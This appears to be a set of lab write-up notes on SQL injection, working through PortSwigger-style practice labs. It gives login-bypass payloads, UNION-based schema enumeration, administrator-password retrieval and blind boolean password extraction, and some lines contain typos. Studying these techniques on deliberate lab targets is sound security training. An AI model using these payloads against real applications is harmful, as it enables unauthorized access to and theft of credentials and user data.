# Labs

If you're familiar with the basic concepts behind SQLi vulnerabilities and want to practice exploiting them on some realistic, deliberately vulnerable targets, you can access labs in this topic from the link below.

- [View all SQL injection labs](https://portswigger.net/web-security/all-labs#sql-injection)

# What is SQL injection (SQLi) ?
SQL injection (SQLi) is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. This can allow an attacker to view data that they are not normally able to retrieve. This might include data that belongs to other users, or any other data that the application can access. In many cases, an attacker can modify or delete this data, causing persistent changes to the application's content or behavior.

In some situations, an attacker can escalate a SQL injection attack to compromise the underlying server or other back-end infrastructure. It can also enable them to perform denial-of-service attacks.

# What is the impact of a successful SQL injection attack?
A successful SQL injection attack can result in unauthorized access to sensitive data, such as:

- Passwords.

- Credit card details.

- Personal user information.

SQL injection attacks have been used in many high-profile data breaches over the years. These have caused reputational damage and regulatory fines. In some cases, an attacker can obtain a persistent backdoor into an organization's systems, leading to a long-term compromise that can go unnoticed for an extended period.

# Some cases of SQL injection

## 1. SQL injection vulnerability in WHERE clause allowing retrieval of hidden data

When the user selects the Gifts section, the query will be:

`SELECT* FROM products WHERE category='Gifts' AND released=1`

Implement insert `'or 1=1 --` then the question will be

`SELECT* FROM products WHERE category='Gifts' or 1=1 -- AND released =`

Then, `SELECT` will select all the information from products table.

## 2. SQL injection vulnerability allowing login bypass

When inserted into `administrator' or 1=1--` then when querying
`WHERE username = administrator' or 1=1-- 
will return a result of `TRUE`, so you can log in with a username of administrator.

## 3. SQL injection attack, querying the database type and version on Oracle

Use the query `'UNION SELECT 'abc' FROM DUAL`, which in turn increments the columns `SELECT` is needed to determine the number of columns that return the data of the preceding query. Because 
`UNION` only returns when both queries have the same number of columns and the dual table is an existing table 
in Oracle.

Continue querying the version by inserting `'UNION SELECT BANNER,' 'xyz' 
FROM V$VERSION.`

Since `UNION` is a combination, the data of both `SELECT` sentences will be displayed.

## 4. SQL injection attack, querying the database type and version on MySQL and Microsoft.

Edit the filter category one by one, increasing the number of columns returned. 

For example, you can insert `'UNION SELECT 'a'#`. 

The `#` sign at the end functions as a comment, similar to `--comment.`

Once you determine the number of data columns returned, modify the filter category to query the version by inserting `'UNION SELECT @@VERSION, NULL#.`

## 5. SQL injection attack, listing the database contents on non-Oracle databases.

Insert `'ORDER BY 2--` to check the number of data columns returned, when `'ORDER BY 3--` will return an Internal Server Error. Deduce the number of returned data columns is 2.

Insert `'UNION SELECT TABLE_NAME, NULL FROM INFROMATION_SCHEMA.TABLES--` to find tables that could contain user information. 

Continue inserting `'UNION SELECT COLUMN_NAME, NULL FROM INFROMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'users_qoecyz'--` to find names of data columns.

After querying, we found that the names of the two columns are `username_X` and `password_Y`.

Next, insert `'UNION SELECT password_Y, NULL FROM users_qoecyz 
WHERE username_X = 'administrator'--` to retrieve the password of the administrator.

## 6. SQL injection attack, listing the database contents on Oracle

Insert `'UNION SELECT 'a', 'b' FROM DUAL--` to determine the number of columns returned.

Insert `'UNION SELECT TABLE_NAME, NULL FROM ALL_TABLES--` to find table names that contain user information.

Insert `'UNION SELECT COLUMN_NAME, NULL FROM 
ALL_TAB_COLUMNS WHERE TABLE_NAME = 'USERS_ELCPUF'--` to determine the column that contains usernames and user passwords. We can see that the two columns are `USERNAME_OTLSQB` and `PASSWORD_ALNMIB.`

Finally, after inserting `'UNION SELECT PASSWORD_ALNMIB, NULL FROM USERS_ELCPUF 
WHERE USERNAME_OTLSQB ='administrator'--` we can retrieve the administrator' password.

## 7. SQL injection UNION attack determining the number of columns returned by the query

We can insert `'UNION SELECT NULL, NULL, NULL--` or `'ORDER BY 3--` to find the columns returned. Increase the number of `NULL` select columns or the number of columns, respectively in the ordering. 

With `'UNION SELECT NULL, NULL, NULL--` returns an error if the number of select columns is not correct.

Using `'ORDER BY 3'` returns an error if the number of columns in the previous query is exceeded.

## 8. SQL injection UNION attack, finding a column containing text

Insert `'ORDER BY 3--` to determine the columns returned.

Try inserting one by one to identify the text return column:

`'UNION SELECT 'a', NULL, NULL--`

`'UNION SELECT NULL, 'a', NULL--`

`'UNION SELECT NULL, NULL, 'a'--`

`...`

## 9. SQL injection UNION attack, retrieving data from other tables

Insert `'ORDER BY 2--` to determine the comlumns returned.

Insert `'UNION SELECT TABLE_NAME, NULL FROM 
INFORMATION_SCHEMA.TABLES--` to determine table names that contain users' information.

Insert `'UNION SELECT COLUMN_NAME, NULL FROM 
INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME = 'users'--` to determine the columns that contain username and user password.

Last, insert `'UNION SELECT password FROM users WHERE username = 
'administrator'--` to retrieve the administrator's information.

## 10. Blind SQL injection with conditional responses

Validate if the "users" table exists by inserting:

`and (SELECT 'x' FROM users LIMIT1)='x'--`

The result will return that users table doesn't exist.

Authenticating the administrator username does not exist in the users table by inserting:

`and (SELECT username FROM users WHERE username='administrator')='administrator'--`

And this will return that the administrator user exist.

Next, we will redict the password length of the administrator user by adding `length(password) > 1` and `length(password) > 50`. 

`and (SELECT username FROM users WHERE username='administrator' and length(password) > 1)='administrator'--`

`and (SELECT username FROM users WHERE username='administrator' and length(password) > 50)='administrator'--`

The length of the password is between [1;50] characters. To find more quickly, we use sniper. Wait a minute and we can find the right length.

After have the true length, we will predict the first character of the password by inserting:

`and (SELECT substring(password, 1, 1) from users WHERE username='adminitrator')='a'--`

If it is not the right, we use Brute Force method and can find the result.

To find other characters of the password, we set up two payloads, with payload 1 indicating the location of the password and payload 2 representing the character that is held at that position. Then proceed to launch the attack. 


